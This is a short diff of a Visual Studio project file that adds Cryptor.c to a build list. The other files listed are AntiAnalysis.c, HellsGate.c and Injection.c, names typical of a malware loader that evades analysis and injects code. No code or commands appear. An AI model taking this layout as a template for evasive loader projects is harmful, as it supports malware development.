@@ -130,6 +130,7 @@
   <ItemGroup>
     <ClCompile Include="AntiAnalysis.c" />
     <ClCompile Include="Common.c" />
+    <ClCompile Include="Cryptor.c" />
     <ClCompile Include="HellsGate.c" />
     <ClCompile Include="main.c" />
     <ClCompile Include="Injection.c" />
